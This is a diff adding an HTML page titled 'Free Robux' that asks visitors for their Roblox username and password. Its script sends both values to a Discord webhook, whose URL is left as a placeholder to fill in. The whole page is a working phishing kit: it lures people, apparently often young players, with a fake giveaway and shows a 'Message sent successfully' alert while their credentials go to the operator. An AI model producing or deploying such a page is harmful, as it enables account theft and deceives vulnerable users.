@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        .container h1 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .form-group button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Free Robux Type Roblox info below</h1>
+        <div id="dynamic-inputs"></div>
+        <div class="form-group">
+            <button id="submit">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        // Define the inputs here
+        const inputsConfig = [
+            { id: 'input1', label: 'Username', placeholder: 'Your Username' },
+            { id: 'input2', label: 'Password', placeholder: 'Your Password' }
+        ];
+
+        // Generate the inputs dynamically
+        const dynamicInputs = document.getElementById('dynamic-inputs');
+        inputsConfig.forEach(input => {
+            const formGroup = document.createElement('div');
+            formGroup.className = 'form-group';
+            formGroup.innerHTML = `
+                <label for="${input.id}">${input.label}</label>
+                <input type="text" id="${input.id}" placeholder="${input.placeholder}">
+            `;
+            dynamicInputs.appendChild(formGroup);
+        });
+
+        document.getElementById('submit').addEventListener('click', () => {
+            const values = inputsConfig.map(input => {
+                const value = document.getElementById(input.id).value;
+                return `${input.label}: ${value}`;
+            });
+
+            // Replace this with your Discord Webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+
+            const data = {
+                content: values.join('\n')
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Message sent successfully!');
+                } else {
+                    alert('Error sending message.');
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
